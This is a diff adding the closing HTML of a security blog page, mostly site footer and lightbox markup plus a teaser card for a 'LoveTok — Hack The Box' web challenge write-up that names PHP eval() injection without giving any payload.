+            <time class="post-card-meta-date" datetime="2026-02-22">22 Feb 2026</time>
+                <span class="post-card-meta-length">3 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post">
+
+    <a class="post-card-image-link" href="../lovetok-hack-the-box/index.html">
+
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2026/02/image-5.png 300w,
+                   ../content/images/size/w600/2026/02/image-5.pngg 600w,
+                  ../content/images/size/w1000/2026/02/image-5.pngng 1000w,
+                 ../content/images/size/w2000/2026/02/image-5.pngpng 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2026/02/image-5.png"
+            alt="LoveTok — Hack The Box"
+            loading="lazy"
+        />
+
+
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../lovetok-hack-the-box/index.html">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    LoveTok — Hack The Box
+                </h2>
+            </header>
+                <div class="post-card-excerpt">Today we have fairly easy challenge from web category called “LoveTok”. LoveTok requires us injecting php code inside eval() function so we get RCE. Without further ado, let’s dive into the challenge.
+
+Note: I have downloaded the files and ran webserver inside the docker container
+
+After downloading the source</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2026-02-21">21 Feb 2026</time>
+                <span class="post-card-meta-length">3 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                </div>
+            </aside>
+
+
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html">Nikostan</a> &copy; 2026</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js%3Fv=eef7a379b2"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+
+
+</body>
+</html>
